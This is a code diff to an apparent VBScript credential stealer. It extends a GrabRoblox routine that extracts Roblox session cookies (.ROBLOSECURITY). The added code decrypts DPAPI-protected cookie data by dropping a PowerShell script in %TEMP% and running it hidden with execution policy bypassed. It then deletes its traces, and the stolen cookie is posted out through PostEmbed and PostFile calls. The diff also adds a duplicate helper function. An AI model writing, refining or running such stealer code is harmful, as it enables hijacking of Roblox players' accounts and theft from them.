@@ -68,6 +68,21 @@ Sub GrabRoblox()
     Dim cookie: cookie = ""
     Dim approach: approach = ""
     If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
+    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
+        approach = "JSON-DPAPI"
+        Dim sp: sp = InStr(raw, "CookiesData"":""")
+        If sp > 0 Then
+            sp = sp + 14
+            Dim ep: ep = InStr(sp, raw, """")
+            If ep > sp Then
+                Dim b64: b64 = Mid(raw, sp, ep - sp)
+                If Len(b64) > 100 Then
+                    cookie = DecryptDPAPI(b64)
+                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
+                End If
+            End If
+        End If
+    End If
     If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
         approach = "Raw-ROBLOSECURITY"
         Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
@@ -77,6 +92,28 @@ Sub GrabRoblox()
     Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
     Call PostFile("cookie.txt", cookie)
 End Sub
+
+Function DecryptDPAPI(b64)
+    DecryptDPAPI = ""
+    On Error Resume Next
+    Dim inf: inf = TmpFile("dpi.txt")
+    Dim outf: outf = TmpFile("dpo.txt")
+    fso.DeleteFile outf, True
+    WriteFile inf, b64
+    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim psf: psf = TmpFile("dpapi.ps1")
+    WriteFile psf, ps
+    sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """", 0, True
+    If fso.FileExists(outf) Then
+        Dim sz: sz = fso.GetFile(outf).Size
+        If sz > 20 Then DecryptDPAPI = ReadFile(outf)
+    End If
+    fso.DeleteFile inf, True
+    fso.DeleteFile psf, True
+    fso.DeleteFile outf, True
+End Function
+
+Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 
